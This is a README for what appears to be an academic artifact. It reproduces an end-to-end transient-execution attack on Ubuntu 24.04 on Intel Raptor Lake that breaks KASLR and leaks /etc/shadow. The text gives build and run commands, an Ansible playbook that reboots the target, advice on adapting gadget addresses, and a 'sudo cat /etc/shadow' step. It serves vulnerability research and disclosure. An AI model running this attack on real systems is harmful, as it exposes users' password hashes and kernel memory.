# End-to-End Attack

End-to-end attack against Ubuntu 24.04 kernel version 6.8.0-47-generic on an Intel Raptor Lake processor.
For the attack to work on other distros or kernel versions, you need to adapt the gadget addresses in `kaslr.c` and `attack.c`.
Furthermore, the attack currently only searches about 32GiB of memory when looking for the reload buffer, physmap and `/etc/shadow`.
If your system memory is larger, you need to increase `MEMORY_SIZE` in `attack.c` accordingly.


## Reproduce

The output is stored in [out](./out).

>[!TIP]
> The attack was specifically designed for Intel Raptor Lake processors.
> However, thanks to our artifact evaluators, we know that the attack also works on Xeon silver 4514Y (and subsequently our Xeon Silver 4510).
> Since the attack expects 48-bit address spaces (although this is not in general a hard requirement), we need to add `no5lvl` to the kernel commandline on these processors.

### Ansible

> [!WARNING]
> The ansible playbook modifies the target system without requesting confirmation to ensure default Linux mitigations are applied in GRUB kernel commandline. The target system will also be repeatedly rebooted between attack runs to ensure KASLR is re-randomized.

```bash
ansible-playbook run.yaml -e host=<hostname>
```

## Manual


Run the end-to-end attack
```bash
export experiment_core=2
export OUT_DIR=./out/manual/0/
mkdir -p "$OUT_DIR"

# build
make clean
make

# break KASLR
make run-kaslr CORE=$experiment_core | tee "$OUT_DIR/manual-kaslr.out"
# this will print KASLR offset: <kaslr_offset> with the value needed in the next steps

# leak /etc/shadow
make run-shadow KASLR_OFFSET=<kaslr_offset> CORE=$experiment_core | tee "$OUT_DIR/manual-shadow.out"
```

Benchmark the leak bandwidth.
```bash
# load the secret kernel module for benchmarking the leak bandwidth
make -C ../uarch-research-fw/kmod_secret/ install

make run-benchmark KASLR_OFFSET=<kaslr_offset> CORE=$experiment_core | tee "$OUT_DIR/manual-benchmark.out"
```


## Analyze

It is extremely likely that your system uses a different root password hash than ours.
To make the analysis script work, you should replace `ROOT_HASH` in `analyze.py` with the first line of your `/etc/shadow`.
You can use `sudo cat /etc/shadow` to get the contents of your shadow file.

```bash
python3 analyze.py
```

The results are printed to the console.

### Expected Results

We expect the attack to work successfully in a high number of cases (>90%) with a leak rate of over 5KiB/s in the median.
